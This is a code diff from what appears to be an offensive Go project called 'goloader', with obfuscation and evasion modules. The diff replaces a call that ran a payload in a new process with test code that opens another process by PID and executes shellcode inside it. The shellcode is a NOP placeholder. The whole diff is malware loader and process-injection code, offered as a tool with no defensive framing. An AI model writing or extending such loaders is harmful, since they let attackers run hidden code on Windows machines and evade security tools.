@@ -3,14 +3,15 @@ import (
 	"fmt"
 	"flag"
 	"strings"
+	"strconv"
 
 	// Own modules
 	"goloader/internal/helpers"
 	"goloader/internal/obfuscator"
 	"goloader/internal/syscall"
-
-	// Own modules for Windows -> Uncomment import for compilation for windows
 	"goloader/internal/evasion"
+
+	"golang.org/x/sys/windows"
 )
 
 func main() {
@@ -54,5 +55,13 @@ func main() {
 		}
 
 		// Do the system magic
-		syscall.ExecuteSystemCallInNewProcess(payload)
+		//syscall.ExecuteSystemCallInNewProcess(payload)
+	
+		// Testing ....	
+		shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP slide
+		pid, _ := strconv.Atoi(payload)
+		processHandle := syscall.OpenProcessByProcessID(pid)
+		if processHandle != windows.InvalidHandle {
+			syscall.ExecuteShellcodeOnProcess(processHandle, shellcode);
+		}
 	}
